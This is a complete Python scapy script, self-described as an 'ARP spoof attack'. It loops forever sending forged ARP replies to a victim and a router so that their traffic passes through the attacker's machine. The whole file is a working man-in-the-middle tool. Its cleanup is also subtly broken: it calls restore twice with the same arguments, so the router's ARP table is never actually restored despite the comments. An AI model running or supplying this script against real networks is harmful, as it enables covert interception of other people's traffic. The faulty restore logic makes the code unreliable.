#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import argparse

def get_arguments():
	parser = argparse.ArgumentParser(description= "ARP spoof attack")	
	parser.add_argument("--target", dest= "victimIP", help= "Input specify Victim IP addres", required= True)
	parser.add_argument("--spoof", dest= "spoofIP", help= "Input specify Spoofing IP addres", required= True)
	return parser.parse_args()

def getmac(ip):	
	arp_request = scapy.ARP(pdst = ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request
	answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
	return  answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
	target_mac = getmac(target_ip)
	arp_respond = scapy.ARP(op= 2, pdst= target_ip, hwdst= target_mac, psrc= spoof_ip)
	#arp_respond = scapy.ARP(op="1 for request 2 for respond,pdst="victim-ip",hwdst="victim-mac",psrc="Router-ip")
	scapy.send(arp_respond, verbose= False)

def restore(destination_ip,source_ip):
	dst_mac = getmac(destination_ip)
	src_mac = getmac(source_ip)
	arp_respond = scapy.ARP(op= 2, pdst= destination_ip, hwdst= dst_mac, psrc= source_ip, hwsrc= src_mac)
	scapy.send(arp_respond, verbose= False, count= 4)

args = get_arguments()

count = 0
try:
	while True:		
		#telling client i am the router
		spoof(args.victimIP, args.spoofIP)
		#telling router i am the client
		spoof(args.spoofIP, args.victimIP)		
		count = count + 2
		print("\r[+] send two packets {}".format(count))
		time.sleep(2)

except KeyboardInterrupt:

		print("\n[+] Detected CTRL+C Quitting and restoring arp value please wait")
		restore(args.victimIP, args.spoofIP)
		#restoring client
		restore(args.victimIP, args.spoofIP)
		#restoring router